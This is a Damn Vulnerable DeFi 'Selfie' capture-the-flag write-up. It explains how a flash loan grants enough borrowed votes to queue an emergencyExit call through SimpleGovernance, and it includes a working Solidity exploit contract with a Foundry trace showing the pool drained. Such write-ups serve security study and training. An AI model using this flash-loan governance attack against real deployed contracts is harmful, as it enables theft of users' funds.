# Damn Vulnerable Defi - Selfie
- Scope
    - SelfiePool.sol
    - SimpleGovernance.sol
    - ISimpleGovernance.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## Anyone can `emergencyExit()` can be added to Governance's `queueAction()` to drain pool's funds.

### Summary
The `queueAction()` function allows anyone to add `emergencyExit()` from SelfiePool which can drain the pool's tokens.

### Vulnerability Details
```diff
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }

        if (target == address(this)) {
            revert InvalidTarget();
        }

        if (data.length > 0 && target.code.length == 0) {
            revert TargetMustHaveCode();
        }

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked {
            _actionCounter++;
        }

        emit ActionQueued(actionId, msg.sender);
    }
```

### Impact/Proof of Concept
1. call flashloan
2. flashloan calldata to governance to add queueAction (this will fulfill >= 50% DVT supply as we have flash loan)
3. queueAction will use governance to call -> SelfiePool and perform EmergencyExit
4. return flashloan so tx wont revert
5. fast forward 2 days
6. execute action and drain tokens from pool to recovery
```diff
function test_selfie() public checkSolvedByPlayer {
        Exploit attacker = new Exploit(
            address(pool),
            address(governance),
            address(token),
            recovery,
            uint128(TOKENS_IN_POOL)
        );

        attacker.attack();     
        vm.warp(block.timestamp + 2 days);
        attacker.withdraw();
        console.log("pool balance: ", token.balanceOf(address(pool)) / 1e18);
        console.log("recovery balance: ", token.balanceOf(recovery) / 1e18);
    }

contract Exploit is IERC3156FlashBorrower {
    SelfiePool selfiePool;
    SimpleGovernance governance;
    DamnValuableVotes damnValuableToken;
    address recovery;
    uint actionId;
    uint128 loanAmount;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(address _selfiePool, address _simpleGovernance, address _token, address _recovery, uint128 _amount) {
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
        recovery = _recovery;
        loanAmount = _amount;
    }

    // Custom malicious onFlashLoan() that calls Governance and add queueAction to perform EmergencyExit on SelfiePool
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data) external returns (bytes32) {
            // Delegate voting units to pass the queueAction requirement
            damnValuableToken.delegate(address(this));
            uint _actionId = governance.queueAction(
                address(selfiePool),
                0,
                data
            );
            actionId = _actionId;
            IERC20(token).approve(address(selfiePool), amount+fee);
            return CALLBACK_SUCCESS;
        }

    function attack() external {
        bytes memory exitData = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
            );
        require(selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), loanAmount, exitData));
    }

    function withdraw() external {
        governance.executeAction(actionId);
    }
}
```

Results
```diff
[PASS] test_selfie() (gas: 785378)
Logs:
  pool balance:  0
  recovery balance:  1500000

Traces:
  [785378] SelfieChallenge::test_selfie()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [431100] → new Exploit@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 1597 bytes of code
    ├─ [305490] Exploit::attack()
    │   ├─ [301354] SelfiePool::flashLoan(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 1500000000000000000000000 [1.5e24], 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)
    │   │   ├─ [34680] DamnValuableVotes::transfer(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit Transfer(from: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], to: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [247775] Exploit::onFlashLoan(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 1500000000000000000000000 [1.5e24], 0, 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)
    │   │   │   ├─ [70257] DamnValuableVotes::delegate(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   ├─ emit DelegateChanged(delegator: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   ├─ emit DelegateVotesChanged(delegate: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], previousVotes: 0, newVotes: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [125514] SimpleGovernance::queueAction(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 0, 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)
    │   │   │   │   ├─ [966] DamnValuableVotes::getVotes(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   │   │   │   ├─ [2349] DamnValuableVotes::totalSupply() [staticcall]
    │   │   │   │   │   └─ ← [Return] 2000000000000000000000000 [2e24]
    │   │   │   │   ├─ emit ActionQueued(actionId: 1, caller: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   │   │   └─ ← [Return] 1
    │   │   │   ├─ [24762] DamnValuableVotes::approve(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])
    │   │   │   │   ├─ emit Approval(owner: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9
    │   │   ├─ [8928] DamnValuableVotes::transferFrom(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit Transfer(from: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   ├─ emit DelegateVotesChanged(delegate: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], previousVotes: 1500000000000000000000000 [1.5e24], newVotes: 0)
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(172801 [1.728e5])
    │   └─ ← [Return] 
    ├─ [41014] Exploit::withdraw()
    │   ├─ [39917] SimpleGovernance::executeAction(1)
    │   │   ├─ emit ActionExecuted(actionId: 1, caller: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   ├─ [33904] SelfiePool::emergencyExit(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   │   │   ├─ [563] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    │   │   │   ├─ [30680] DamnValuableVotes::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1500000000000000000000000 [1.5e24])
    │   │   │   │   ├─ emit Transfer(from: SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit EmergencyExit(receiver: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1500000000000000000000000 [1.5e24])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x
    │   └─ ← [Stop] 
    ├─ [563] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("pool balance: ", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [563] DamnValuableVotes::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    ├─ [0] console::log("recovery balance: ", 1500000 [1.5e6]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [563] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [563] DamnValuableVotes::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1500000000000000000000000 [1.5e24]
    ├─ [0] VM::assertEq(1500000000000000000000000 [1.5e24], 1500000000000000000000000 [1.5e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.35ms (466.14µs CPU time)
```
